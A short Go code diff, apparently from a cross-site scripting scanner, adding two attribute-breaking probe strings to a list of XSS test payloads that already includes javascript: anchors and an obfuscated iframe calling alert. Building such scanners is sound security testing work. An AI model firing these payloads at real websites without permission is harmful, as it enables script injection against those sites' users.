@@ -25,6 +25,8 @@ func getCommonPayload() []string {
 		"\"><a href=\"javascript&colon;alert(45)\">click",
 		"'><a href='javascript&colon;alert(45)'>click",
 		"\"><iFrAme/src=jaVascRipt:alert(45)></iFramE>",
+		"\">asd",
+		"'>asd",
 	}
 	return payload
 }
